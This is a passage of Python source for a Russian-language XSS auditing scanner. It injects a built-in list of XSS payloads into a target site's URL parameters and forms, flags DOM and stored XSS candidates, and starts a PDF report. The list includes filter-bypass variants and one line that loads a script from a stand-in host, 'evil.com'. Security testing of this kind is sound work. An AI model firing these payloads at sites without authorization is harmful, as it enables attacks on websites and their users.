import requests
import sys
import time
import json
import argparse
import re
import random
import string
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from html import escape
import threading
import os

try:
    from reportlab.lib.pagesizes import A4
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, PageBreak
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib import colors
    from reportlab.lib.enums import TA_CENTER, TA_LEFT
    from reportlab.pdfbase import pdfmetrics
    from reportlab.pdfbase.ttfonts import TTFont
    PDF_SUPPORT = True
except ImportError:
    PDF_SUPPORT = False

class XSSAuditor:
    def __init__(self, target_url, max_threads=10, cookies=None, headers=None):

        self.target_url = target_url.rstrip('/')
        parsed_url = urlparse(target_url)
        self.base_domain = parsed_url.netloc
        self.scheme = parsed_url.scheme or 'http'
        self.max_threads = max_threads
        self.session = requests.Session()
        default_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'keep-alive',
            'Referer': target_url,
        }
        if headers:
            default_headers.update(headers)
        self.session.headers.update(default_headers)
        self.vulnerabilities = []
        self.stats = {
            'start_time': time.time(),
            'requests_sent': 0,
            'pages_scanned': 0,
            'forms_found': 0,
            'parameters_tested': 0,
            'vulnerabilities_found': 0,
            'reflected_xss': 0,
            'stored_xss_potential': 0,
            'dom_xss_potential': 0,
        }
        self.xss_payloads = self._load_comprehensive_xss_payloads()
        self.lock = threading.Lock()
        print(f"Инициализирован XSS-сканер для: {self.target_url}")
        print(f"Загружено XSS-векторов: {len(self.xss_payloads)}")

    def _safe_request(self, method, url, **kwargs):
        """Безопасная отправка запроса с подсчетом"""
        try:
            response = self.session.request(method, url, timeout=10, **kwargs)
            self.stats['requests_sent'] += 1
            return response
        except requests.RequestException as e:
            print(f"Ошибка запроса к {url}: {e}")
            return None

    def _load_comprehensive_xss_payloads(self):
        """Загрузка полного набора XSS векторов"""
        payloads = []
        print("Загрузка базовых XSS векторов")
        basic_payloads = [
            '<script>alert("XSS")</script>',
            '<script>alert(1)</script>',
            '<img src=x onerror=alert("XSS")>',
            '""><img src=x onerror=alert(1)>',
            '<script>alert(document.cookie)</script>',
            '<script>alert(window.location)</script>',
            '<script>prompt("XSS")</script>',
            '<script>confirm("XSS")</script>',
            '<img src="javascript:alert(\'XSS\')">',
            '<img src=x onerror=alert(1)>',
            '<img src=x onmouseover=alert(1)>',
            '<img src=x onload=alert(1)>',
            '<svg onload=alert(1)>',
            '<svg/onload=alert("XSS")>',
            '<svg><script>alert(1)</script></svg>',
        ]
        payloads.extend(basic_payloads)

        print("Загрузка векторов для атрибутов")
        attribute_payloads = [
            '" onmouseover="alert(\'XSS\')',
            '\' onfocus=\'alert("XSS")\' autofocus',
            ' onmouseover=alert(1)',
            ' onfocus=alert(1)',
            ' onload=alert(1)',
            ' onerror=alert(1)',
            ' onclick=alert(1)',
            'javascript:alert("XSS")',
            'jav&#x61;script:alert("XSS")',
            'JaVaScRiPt:alert("XSS")',
            'text/html,<script>alert("XSS")</script>',
        ]
        payloads.extend(attribute_payloads)

        print("Загрузка полиморфных векторов")
        polymorphic_payloads = [
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            '<scr\x00ipt>alert(1)</scr\x00ipt>',
            '<scr\x0Aipt>alert(1)</scr\x0Aipt>',
            '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E',
            '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
            '&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;',
            '<ScRiPt>alert(1)</ScRiPt>',
            '<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>',
            '<IMG SRC=JaVaScRiPt:alert("XSS")>',
        ]
        payloads.extend(polymorphic_payloads)

        print("Загрузка векторов событий")
        event_payloads = [
            '<BODY ONLOAD=alert("XSS")>',
            '<body onload=alert(1)>',
            '<body onunload=alert(1)>',
            '<body onpageshow=alert(1)>',
            '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
            '<iframe src=javascript:alert(1)>',
            '<frame src=javascript:alert(1)>',
            '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">',
            '<button onmouseover=alert(1)>Click</button>',
            '<select onfocus=alert(1)><option>test</option></select>',
            '<audio src=x onerror=alert(1)>',
            '<video src=x onerror=alert(1)>',
            '<video><source onerror=alert(1)></video>',
        ]
        payloads.extend(event_payloads)

        print("Загрузка HTML5 векторов")
        html5_payloads = [
            '<details open ontoggle=alert(1)>',
            '<details ontoggle=alert(1)>',
            '<dialog open onclick=alert(1)>Dialog</dialog>',
            '<menu onclick=alert(1)>Menu</menu>',
            '<marquee onstart=alert(1)>Marquee</marquee>',
            '<meter onclick=alert(1)>Meter</meter>',
            '<progress onclick=alert(1)>Progress</progress>',
            '<output onmouseover=alert(1)>Output</output>',
            '<keygen onfocus=alert(1)>',
        ]
        payloads.extend(html5_payloads)

        print("Загрузка DOM-based векторов")
        dom_payloads = [
            '#<script>alert(1)</script>',
            '#<img src=x onerror=alert(1)>',
            '#javascript:alert(1)',
            '#" onmouseover="alert(1)',
            "#' onfocus='alert(1)",
            '?param=<script>alert(1)</script>',
            '?param=javascript:alert(1)',
        ]
        payloads.extend(dom_payloads)

        print("Загрузка векторов для обхода фильтров")
        filter_bypass_payloads = [
            '><script>alert(1)</script>',
            '"></script><script>alert(1)</script>',
            '</script><script>alert(1)</script>',
            '</script><script>alert(1)</script><script>',
            '<script>alert(1)//</script>',
            '<script>alert(1)/*/</script>',
            'onclick=alert(1)',
            'onclick = alert(1)',
            'onclick =alert(1)',
            'onclick= alert(1)',
            'javascript&colon;alert(1)',
            'javascript&#58;alert(1)',
            'javascript&#0058;alert(1)',
            'javascript&#x3a;alert(1)',
            '%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E',
            '&amp;lt;script&amp;gt;alert(&amp;quot;1&amp;quot;)&amp;lt;/script&amp;gt;',
        ]
        payloads.extend(filter_bypass_payloads)

        print("Загрузка контекстных векторов")
        context_payloads = [
            ';alert(1);//',
            'alert(1)//',
            '\';alert(1);//',
            '";alert(1);//',
            '`;alert(1);//',
            'background:javascript:alert(1)',
            'background:url(javascript:alert(1))',
            'expression(alert(1))',
            '-moz-binding:url("text/xml,<xml>...</xml>")',
            'javascript://%0Aalert(1)',
            'javascript://%0D%0Aalert(1)',
            'javascript://comment%0Aalert(1)',
        ]
        payloads.extend(context_payloads)

        unique_payloads = list(dict.fromkeys(payloads))
        return unique_payloads

    def full_xss_scan(self):
        """Полное сканирование на XSS уязвимости"""
        print("Начало сканирования XSS")
        print(f"Цель: {self.target_url}")
        print(f"Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

        try:
            print("Разведка сайта")
            print("Получение главной страницы")
            main_response = self._safe_request('GET', self.target_url)
            if not main_response or main_response.status_code != 200:
                print(f"Ошибка доступа к сайту (код: {main_response.status_code if main_response else 'нет ответа'})")
                return self.vulnerabilities
            self.stats['pages_scanned'] += 1
            main_content = main_response.text

            print("Анализ HTML-структуры")
            page_info = self._analyze_page(main_content)

            print("\nПоиск точек ввода")
            forms = self._find_all_forms(main_content)
            self.stats['forms_found'] = len(forms)
            print(f"Найдено форм: {len(forms)}")

            urls = self._find_all_urls(main_content)
            param_urls = [url for url in urls if '?' in url]
            print(f"Найдено URL с параметрами: {len(param_urls)}")

            js_sources = self._find_javascript_sources(main_content)
            print(f"Найдено источников JavaScript: {len(js_sources)}")

            print("\nXSS тестирование")
            if param_urls:
                print("Тестирование URL параметров")
                url_results = self._test_url_parameters(param_urls)
                self.vulnerabilities.extend(url_results)
                self.stats['reflected_xss'] += len([v for v in url_results if 'Reflected' in v['type']])

            if forms:
                print("Тестирование HTML форм")
                form_results = self._test_forms_xss(forms)
                self.vulnerabilities.extend(form_results)
                self.stats['reflected_xss'] += len([v for v in form_results if 'Reflected' in v['type']])

            #поиск потенциальных DOM и Stored XSS
            dom_results = self._scan_for_dom_xss(main_content, js_sources)
            self.vulnerabilities.extend(dom_results)
            self.stats['dom_xss_potential'] += len([v for v in dom_results if 'DOM-based' in v['type']])

            stored_results = self._find_stored_xss_potential(forms)
            self.vulnerabilities.extend(stored_results)
            self.stats['stored_xss_potential'] += len([v for v in stored_results if 'Stored' in v['type']])

            self.stats['vulnerabilities_found'] = len(self.vulnerabilities)
            self.stats['parameters_tested'] = self._calculate_parameters_tested()

        except KeyboardInterrupt:
            print("Сканирование прервано пользователем")
            return self.vulnerabilities
        except Exception as e:
            print(f"Ошибка при сканировании: {e}")
            import traceback
            traceback.print_exc() #трассировка для отладки
            return self.vulnerabilities

        #Вывод результатов
        self._print_results_summary()
        return self.vulnerabilities

    def _analyze_page(self, html_content):
        """Анализ HTML страницы"""
        info = {
            'title': 'Не определен',
            'forms_count': 0,
            'inputs_count': 0,
            'links_count': 0,
            'scripts_count': 0,
            'technology_hints': []
        }
        try:
            #Заголовок
            title_match = re.search(r'<title[^>]*>(.*?)</title>', html_content, re.IGNORECASE | re.DOTALL)
            if title_match:
                info['title'] = title_match.group(1).strip()[:100]

            #Подсчет элементов
            info['forms_count'] = len(re.findall(r'<form', html_content, re.IGNORECASE))
            info['inputs_count'] = len(re.findall(r'<input', html_content, re.IGNORECASE))
            info['links_count'] = len(re.findall(r'<a [^>]*href=', html_content, re.IGNORECASE))
            info['scripts_count'] = len(re.findall(r'<script', html_content, re.IGNORECASE))

            #Определение технологий
            tech_patterns = {
                'WordPress': [r'wp-content', r'wp-includes', r'wordpress'],
                'Joomla': [r'joomla', r'media/jui'],
                'Drupal': [r'drupal', r'sites/all'],
                'React': [r'react', r'react-dom', r'__NEXT_DATA__'],
                'Vue.js': [r'vue', r'vue\.js', r'__vue__'],
                'Angular': [r'ng-', r'angular'],

                'jQuery': [r'jquery', r'\$\.' ],
                'Bootstrap': [r'bootstrap', r'btn-'],

                'PHP': [r'\.php', r'php'],

                'ASP.NET': [r'\.aspx', r'asp\.net', r'__VIEWSTATE'],
            }

            for tech, patterns in tech_patterns.items():
                found_tech = False
                for pattern in patterns:
                    #Используем re.IGNORECASE для каждого паттерна
                    if re.search(pattern, html_content, re.IGNORECASE):
                        found_tech = True
                        break  #Если один из паттернов совпал переход к следующей технологии
                if found_tech and tech not in info['technology_hints']:
                    info['technology_hints'].append(tech)


            print(f"Заголовок: {info['title']}")
            print(f"Формы: {info['forms_count']}, Поля: {info['inputs_count']}")
            print(f"Ссылки: {info['links_count']}, Скрипты: {info['scripts_count']}")
            if info['technology_hints']:
                print(f"Технологии: {', '.join(info['technology_hints'])}")

        except Exception as e:
            print(f"Ошибка анализа страницы: {e}")

        return info

    def _find_all_forms(self, html_content):
        """Поиск всех форм на странице"""
        forms = []
        try:
            from bs4 import BeautifulSoup
            BS4_SUPPORT = True
        except ImportError:
            BS4_SUPPORT = False

        if BS4_SUPPORT:
            try:
                soup = BeautifulSoup(html_content, 'html.parser')
                form_elements = soup.find_all('form')
                for form_idx, form in enumerate(form_elements):
                    form_data = {
                        'id': form_idx,
                        'action': form.get('action', ''),
                        'method': form.get('method', 'GET').upper(),
                        'inputs': [],
                        'textareas': [],
                        'selects': [],
                        'html': str(form)[:500]
                    }
                    if form_data['action']:
                        if form_data['action'].startswith('http'):
                            form_data['full_action'] = form_data['action']
                        elif form_data['action'].startswith('/'):
                            form_data['full_action'] = f"{self.scheme}://{self.base_domain}{form_data['action']}"
                        else:
                            form_data['full_action'] = f"{self.target_url}/{form_data['action']}"
                    else:
                        form_data['full_action'] = self.target_url

                    for input_tag in form.find_all('input'):
                        input_data = {
                            'name': input_tag.get('name'),
                            'type': input_tag.get('type', 'text').lower(),
                            'value': input_tag.get('value', ''),
                        }
                        if input_data['name']:
                            form_data['inputs'].append(input_data)

                    for textarea in form.find_all('textarea'):
                        if textarea.get('name'):
                            form_data['textareas'].append({
                                'name': textarea.get('name'),
                                'value': textarea.text
                            })

                    for select in form.find_all('select'):
                        if select.get('name'):
                            form_data['selects'].append({
                                'name': select.get('name'),
                                'options': [option.get('value') for option in select.find_all('option')]
                            })

                    forms.append(form_data)
            except Exception as e:
                print(f"Ошибка BeautifulSoup: {e}")
                forms = self._find_forms_regex(html_content)
        else:
            forms = self._find_forms_regex(html_content)
        return forms

    def _find_forms_regex(self, html_content):
        """Поиск форм с помощью fallback"""
        forms = []
        form_matches = re.findall(r'<form[^>]*>(.*?)</form>', html_content, re.IGNORECASE | re.DOTALL)
        for form_idx, form_html in enumerate(form_matches):
            try:
                action_match = re.search(r'action=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
                method_match = re.search(r'method=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
                form_data = {
                    'id': form_idx,
                    'action': action_match.group(1) if action_match else '',
                    'method': method_match.group(1).upper() if method_match else 'GET',
                    'html': form_html[:500]
                }

                #Полный URL действия
                if form_data['action']:
                    if form_data['action'].startswith('http'):
                        form_data['full_action'] = form_data['action']
                    elif form_data['action'].startswith('/'):
                        form_data['full_action'] = f"{self.scheme}://{self.base_domain}{form_data['action']}"
                    else:
                        form_data['full_action'] = f"{self.target_url}/{form_data['action']}"
                else:
                    form_data['full_action'] = self.target_url

                #Поиск полей ввода
                form_data['inputs'] = []
                input_matches = re.findall(r'<input[^>]*>', form_html, re.IGNORECASE)
                for input_html in input_matches:
                    name_match = re.search(r'name=["\']([^"\']+)["\']', input_html, re.IGNORECASE)
                    type_match = re.search(r'type=["\']([^"\']+)["\']', input_html, re.IGNORECASE)
                    if name_match:
                        form_data['inputs'].append({
                            'name': name_match.group(1),
                            'type': type_match.group(1).lower() if type_match else 'text',
                            'html': input_html[:100]
                        })

                forms.append(form_data)
            except Exception:
                continue
        return forms

    def _find_all_urls(self, html_content):
        """Поиск всех URL на странице"""
        urls = set()
        patterns = [
            r'href=["\']([^"\']+)["\']',
            r'src=["\']([^"\']+)["\']',
            r'action=["\']([^"\']+)["\']',
            r'url\(["\']?([^"\'\)]+)["\']?\)',
        ]
        for pattern in patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE)
            for match in matches:
                if match and not match.startswith(('#', 'javascript:', 'mailto:', 'tel:', 'data:')):
                    full_url = self._make_absolute_url(match)
                    if full_url:
                        urls.add(full_url)
        return list(urls)

    def _make_absolute_url(self, url):
        url = url.strip()
        if url.startswith('http://') or url.startswith('https://'):
            return url
        if url.startswith('//'):
            return f"{self.scheme}:{url}"
        if url.startswith('/'):
            return f"{self.scheme}://{self.base_domain}{url}"
        return f"{self.target_url}/{url}"

    def _find_javascript_sources(self, html_content):
        """Поиск источников JavaScript"""
        sources = set()
        #Внешние скрипты
        script_matches = re.findall(r'<script[^>]*src=["\']([^"\']+)["\'][^>]*>', html_content, re.IGNORECASE)
        for src in script_matches:
            full_url = self._make_absolute_url(src)
            if full_url:
                sources.add(full_url)

        #Встроенные скрипты
        inline_scripts = re.findall(r'<script[^>]*>(.*?)</script>', html_content, re.IGNORECASE | re.DOTALL)
        for script in inline_scripts[:5]: # Ограничиваем количество анализируемых inline скриптов
             if len(script.strip()) > 10:
                 sources.add(f"inline:{script[:200]}")

        return list(sources)

    def _test_url_parameters(self, urls):
        """Тестирование URL параметров на XSS"""
        vulnerabilities = []
        tested_urls = set()
        # Ограничиваем количество URL для тестирования
        max_urls_to_test = min(50, len(urls))
        test_urls = urls[:max_urls_to_test]

        print(f"Тестируется {len(test_urls)} URL с параметрами")
        for url_idx, url in enumerate(test_urls, 1):
            if url_idx % 10 == 0:
                print(f"Прогресс: {url_idx}/{len(test_urls)}")

            try:
                parsed = urlparse(url)
                if parsed.query:
                    query_params = parse_qs(parsed.query)
                    for param_name in query_params:
                        #Базовый URL без параметров
                        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                        #тестовый запрос с разными пейлоадами
                        for payload_idx, payload in enumerate(self.xss_payloads[:15]): # Уменьшаем количество пейлоадов для каждого параметра
                            #тестовый параметр
                            test_params = {param_name: payload}
                            test_url = f"{base_url}?{urlencode(test_params)}"

                            #отправка запроса
                            response = self._safe_request('GET', test_url)
                            if not response:
                                continue

                            #Проверка на XSS
                            if self._is_xss_vulnerable(response, payload, 'URL'):
                                vuln = {
                                    'type': 'Reflected XSS (URL Parameter)',
                                    'url': test_url,
                                    'parameter': param_name,
                                    'payload': payload,
                                    'method': 'GET',
                                    'response_code': response.status_code,
                                    'confidence': 'High',
                                    'description': f'Обнаружена reflected XSS уязвимость в параметре "{param_name}". Пейлоад отображается и выполняется в браузере.',
                                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                                }
                                vulnerabilities.append(vuln)
                                print(f"Найдена XSS: {param_name} в {parsed.path}")
                                break
            except Exception as e:
                print(f"Ошибка тестирования URL {url}: {e}")
                continue
        return vulnerabilities

    def _test_forms_xss(self, forms):
        """Тестирование форм на XSS"""
        vulnerabilities = []
        print(f"Тестируем {len(forms)} форм")

        for form_idx, form in enumerate(forms, 1):
            if form_idx % 5 == 0:
                print(f"Прогресс форм: {form_idx}/{len(forms)}")

            try:
                #выбираем только текстовые поля
                text_inputs = [
                    inp for inp in form['inputs']
                    if inp['type'] in ['text', 'search', 'email', 'url', 'textarea', None]
                ]
                if not text_inputs:
                    continue

                #берем первое текстовое поле для теста
                first_input = text_inputs[0]
                #тест с разными пейлоадами
                for payload in self.xss_payloads[:10]:
                    form_data = {}
                    for inp in form['inputs']:
                        if inp['name']:
                            if inp == first_input:
                                form_data[inp['name']] = payload
                            else:
                                form_data[inp['name']] = 'test'

                    #отправка запроса
                    if form['method'] == 'GET':
                        query_string = urlencode(form_data)
                        test_url = f"{form['full_action']}?{query_string}"
                        response = self._safe_request('GET', test_url)
                    else:
                        response = self._safe_request('POST', form['full_action'], data=form_data)

                    if not response:
                        continue

                    #проверка на XSS
                    if self._is_xss_vulnerable(response, payload, 'FORM'):
                        vuln = {
                            'type': f'Reflected XSS (Form - {form["method"]})',
                            'form_action': form['full_action'],
                            'vulnerable_field': first_input['name'],
                            'payload': payload,
                            'method': form['method'],
                            'response_code': response.status_code,
                            'confidence': 'High',
                            'description': f'Обнаружена XSS уязвимость в поле "{first_input["name"]}" формы. Пейлоад не фильтруется и выполняется в браузере.',
                            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        }
                        if form['method'] == 'GET':
                             vuln['url'] = f"{form['full_action']}?{first_input['name']}={quote(payload)}"
                        vulnerabilities.append(vuln)
                        print(f"Найдена XSS в форме: {first_input['name']}")
                        break # Прекращаем тестировать другие пейлоады для этого поля, если нашли уязвимость
            except Exception as e:
                print(f"Ошибка тестирования формы: {e}")
                continue
        return vulnerabilities

    def _scan_for_dom_xss(self, html_content, js_sources):
        """Поиск DOM-based XSS уязвимостей"""
        vulnerabilities = []
        print("Анализ на DOM-based XSS")
        try:
            #Поиск опасных JavaScript функций
            dangerous_functions = [
                'innerHTML', 'outerHTML', 'document.write', 'document.writeln',
                'eval(', 'setTimeout(', 'setInterval(', 'Function(',
                'location.href', 'location.hash', 'location.search',
                'window.open', 'window.location', 'document.location',
                'postMessage', 'addEventListener', 'attachEvent',
                'execScript', 'msWriteProfilerMark', ]

            #в HTML
            for func in dangerous_functions:
                if func in html_content:
                    vuln = {
                        'type': 'DOM-based XSS (Potential)',
                        'dangerous_function': func,
                        'location': 'HTML content',
                        'confidence': 'Medium',
                        'description': f'Обнаружена потенциально опасная функция "{func}" которая может привести к DOM-based XSS.',
                        'recommendation': 'Используйте textContent вместо innerHTML, избегайте eval() и document.write()',
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    }
                    vulnerabilities.append(vuln)

            #обработчики событий с пользовательским вводом
            event_handlers = [
                'onload', 'onerror', 'onclick', 'onmouseover',
                'onfocus', 'onblur', 'onchange', 'onsubmit',
                'onkeydown', 'onkeypress', 'onkeyup',]
            for handler in event_handlers:
                pattern = rf'{handler}=["\']([^"\']+)["\']'
                matches = re.findall(pattern, html_content, re.IGNORECASE)
                for match in matches:
                    if 'alert' in match or 'document.' in match or 'window.' in match:
                        vuln = {
                            'type': 'DOM-based XSS (Event Handler)',
                            'event_handler': handler,
                            'code': match[:100],
                            'confidence': 'Medium',
                            'description': f'Обнаружен обработчик события "{handler}" с потенциально опасным кодом.',
                            'recommendation': 'Валидируйте и экранируйте данные перед использованием в обработчиках событий',
                            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        }
                        vulnerabilities.append(vuln)

            #из недоверенных источников
            url_sources = [
                'location.hash', 'location.search', 'document.URL',
                'document.referrer', 'window.name', 'document.cookie',]
            for source in url_sources:
                if source in html_content:
                    vuln = {
                        'type': 'DOM-based XSS (Untrusted Source)',
                        'untrusted_source': source,
                        'confidence': 'Low',
                        'description': f'Обнаружено использование непроверенного источника данных "{source}".',
                        'recommendation': 'Всегда валидируйте и экранируйте данные из непроверенных источников',
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    }
                    vulnerabilities.append(vuln)

        except Exception as e:
            print(f"Ошибка поиска DOM XSS: {e}")
        return vulnerabilities

    def _find_stored_xss_potential(self, forms):
        """Поиск потенциала для Stored XSS"""
        vulnerabilities = []
        print("Анализ на Stored XSS потенциал")
        try:
            #формы для комментариев, сообщений, отзывов
            keywords = ['comment', 'message', 'post', 'review', 'feedback',
                        'content', 'body', 'text', 'description', 'title']

            for form in forms:
                for input_field in form['inputs']:
                    field_name = input_field['name'] or ''
                    field_lower = field_name.lower()
                    for keyword in keywords:
                        if keyword in field_lower:
                            # тип поля
                            if input_field['type'] in ['text', 'textarea', None]:
                                vuln = {
                                    'type': 'Stored XSS (Potential)',
                                    'form_action': form['full_action'],
                                    'field_name': field_name,
                                    'field_type': input_field['type'],
                                    'keyword_match': keyword,
                                    'confidence': 'Low',
                                    'description': f'Обнаружено поле "{field_name}" (похоже на поле для контента) которое может быть уязвимо для Stored XSS.',
                                    'recommendation': 'Всегда экранируйте пользовательский контент перед сохранением в БД и перед выводом',
                                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                                }
                                vulnerabilities.append(vuln)
                                break

            #поиск текстовых областей
            for form in forms:
                if form.get('textareas'):
                    for textarea in form['textareas']:
                        vuln = {
                            'type': 'Stored XSS (Potential - Textarea)',
                            'form_action': form['full_action'],
                            'field_name': textarea['name'],
                            'field_type': 'textarea',
                            'confidence': 'Medium',
                            'description': f'Обнаружено текстовое поле "{textarea["name"]}" которое может быть уязвимо для Stored XSS.',
                            'recommendation': 'Всегда экранируйте содержимое textarea перед сохранением и выводом',
                            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        }
                        vulnerabilities.append(vuln)

        except Exception as e:
            print(f"Ошибка поиска Stored XSS: {e}")
        return vulnerabilities

    def _is_xss_vulnerable(self, response, payload, source_type):
        """Определение XSS уязвимости по ответу"""
        if not response or response.status_code != 200:
            return False
        content = response.text

        #есть ли пейлоад в ответе
        payload_in_response = payload in content

        #закодированные версии
        encoded_found = False
        encoded_versions = [
            quote(payload),
            payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#x27;'),
            payload.replace('<', '%3C').replace('>', '%3E'),
        ]
        for encoded in encoded_versions:
            if encoded in content:
                encoded_found = True
                break

        if not payload_in_response and not encoded_found:
            return False

        escaped_payload = escape(payload)
        if escaped_payload in content:
            return False

        #индикаторы выполнения JavaScript
        js_indicators = [
            '<script>', '</script>',
            'onerror=', 'onload=', 'onmouseover=', 'onclick=', 'onfocus=',
            'javascript:', 'alert(', 'confirm(', 'prompt(',
            'document.', 'window.', 'location.',
            'eval(', 'setTimeout(', 'setInterval(',
        ]

        for indicator in js_indicators:
            if indicator in content:
                return True

        #дополнительные проверки для определенных типов источников
        if source_type == 'URL':
            #для URL параметров ищем отражение в определенных контекстах
            contexts = [
                f'>{payload}<',  #Внутри тегов
                f'"{payload}"',  #Внутри атрибутов
                f"'{payload}'",  #Внутри атрибутов с одинарными кавычками
                f'={payload}',  #После знака равно
            ]
            for context in contexts:
                if context in content:
                    return True

        return False

    def _calculate_parameters_tested(self):
        """Расчет количества протестированных параметров"""
        total = 0
        for vuln in self.vulnerabilities:
            if 'parameter' in vuln or 'vulnerable_field' in vuln:
                total += 1
        return total

    def _print_results_summary(self):
        """Вывод сводки результатов"""
        duration = time.time() - self.stats['start_time']
        print("Результаты XSS Сканирования")
        print(f"\nСтатистика:")
        print(f"Общее время: {duration:.2f} секунд")
        print(f"Отправлено запросов: {self.stats['requests_sent']}")
        print(f"Проверено страниц: {self.stats['pages_scanned']}")
        print(f"Найдено форм: {self.stats['forms_found']}")
        print(f"Протестировано параметров: {self.stats['parameters_tested']}")
        if duration > 0:
            speed = self.stats['requests_sent'] / duration
            print(f"  Скорость: {speed:.1f} запросов/сек")

        print(f"\nНайденные уязвимости:")
        print(f"Всего: {self.stats['vulnerabilities_found']}")
        print(f"Reflected XSS: {self.stats['reflected_xss']}")
        print(f"DOM-based XSS (потенциальные): {self.stats['dom_xss_potential']}")
        print(f"Stored XSS (потенциальные): {self.stats['stored_xss_potential']}")

        if self.vulnerabilities:
            print(f"\nКритические уязвимости:")
            for i, vuln in enumerate(self.vulnerabilities[:5], 1):
                if vuln['confidence'] == 'High':
                    vuln_type = vuln['type'].replace('Reflected XSS', 'XSS')
                    print(f"  {i}. {vuln_type}")
                    if 'parameter' in vuln:
                        print(f"     Параметр: {vuln['parameter']}")
                    elif 'vulnerable_field' in vuln:
                        print(f"     Поле: {vuln['vulnerable_field']}")
                    if 'url' in vuln:
                        print(f"     URL: {vuln['url'][:80]}")

        #Оценка безопасности
        print(f"\nОценка Безопасности:")
        if self.stats['reflected_xss'] > 0:
            print("уровень безопасности: низкий")
            print("Обнаружены критические XSS уязвимости")
        elif self.stats['vulnerabilities_found'] > 0:
            print("уровень безопасности: средний")
            print("Обнаружены потенциальные уязвимости")
        else:
            print("уровень безопасности: высокий")
            print("Критические XSS уязвимости не обнаружены")
    def _setup_russian_fonts(self):
        """Настройка русских шрифтов для PDF"""
        try:
            #Попытка использовать стандартный шрифт с поддержкой кириллицы
            pdfmetrics.registerFont(TTFont('DejaVu', 'DejaVuSans.ttf'))
            return True
        except:
            try:
                #Альтернатива
                font_paths = [
                    '/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf',
                    '/usr/share/fonts/truetype/freefont/FreeSans.ttf',
                    'C:\\Windows\\Fonts\\arial.ttf',
                    'C:\\Windows\\Fonts\\times.ttf',
                    '/System/Library/Fonts/Helvetica.ttc',
                    '/Library/Fonts/Arial.ttf'
                ]
                for font_path in font_paths:
                    if os.path.exists(font_path):
                        pdfmetrics.registerFont(TTFont('RussianFont', font_path))
                        return True
                #Если не найден шрифты использует встроенные
                print("Не удалось найти русские шрифты, используем стандартные")
                return False
            except:
                return False

    def generate_pdf_report(self, filename="xss_report.pdf"):
        """Генерирует PDF отчет с поддержкой русского языка"""
        print(f"\nГенерация PDF отчета: {filename}")
        if not PDF_SUPPORT:
             print("Библиотека 'reportlab' не установлена. PDF отчет не может быть создан.")
             return

        try:
            #Настройка русских шрифтов
            fonts_setup = self._setup_russian_fonts()

            #документ
            doc = SimpleDocTemplate(
                filename,
                pagesize=A4,
                rightMargin=72,
                leftMargin=72,
                topMargin=72,
                bottomMargin=72
            )
            #Стили с учетом русского языка
            styles = getSampleStyleSheet()
            #имя шрифта для использования
            font_name = 'RussianFont' if fonts_setup else 'Helvetica'

            #Кастомные стили с русским шрифтом
            title_style = ParagraphStyle(
                'CustomTitle',
                parent=styles['Heading1'],
                fontName=font_name,
                fontSize=16,
                spaceAfter=30,
                alignment=TA_CENTER,
                textColor=colors.HexColor('#2C3E50')
            )
            heading_style = ParagraphStyle(
                'CustomHeading',
                parent=styles['Heading2'],
                fontName=font_name,
                fontSize=14,
                spaceAfter=12,
                spaceBefore=12,
                textColor=colors.HexColor('#2980B9')
            )
            subheading_style = ParagraphStyle(
                'SubHeading',
                parent=styles['Heading3'],
                fontName=font_name,
                fontSize=12,
                spaceAfter=6,
                spaceBefore=6,
                textColor=colors.HexColor('#34495E')
            )
            #Стиль для обычного текста
            normal_style = ParagraphStyle(
                'NormalRussian',
                parent=styles['Normal'],
                fontName=font_name,
                fontSize=10,
                leading=14
            )
            #Стиль для таблиц
            table_style = ParagraphStyle(
                'TableRussian',
                parent=styles['Normal'],
                fontName=font_name,
                fontSize=9,
                leading=12
            )

            #Содержимое документа
            story = []

            #Заголовок
            story.append(Paragraph("Отчет об аудите XSS уязвимостей", title_style))
            story.append(Spacer(1, 20))

            #Информация о сканировании
            story.append(Paragraph("Информация о сканировании", heading_style))
            scan_date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            duration = time.time() - self.stats['start_time']
            info_data = [
                ['Параметр', 'Значение'],
                ['Цель сканирования', self.target_url],
                ['Домен', self.base_domain],
                ['Дата сканирования', scan_date],
                ['Общее время', f"{duration:.1f} секунд"],
                ['Загружено XSS векторов', f"{len(self.xss_payloads)}"],
                ['Отправлено запросов', str(self.stats['requests_sent'])],
                ['Проверено страниц', str(self.stats['pages_scanned'])],
                ['Найдено форм', str(self.stats['forms_found'])],
                ['Протестировано параметров', str(self.stats['parameters_tested'])],
                ['Найдено уязвимостей', str(self.stats['vulnerabilities_found'])]
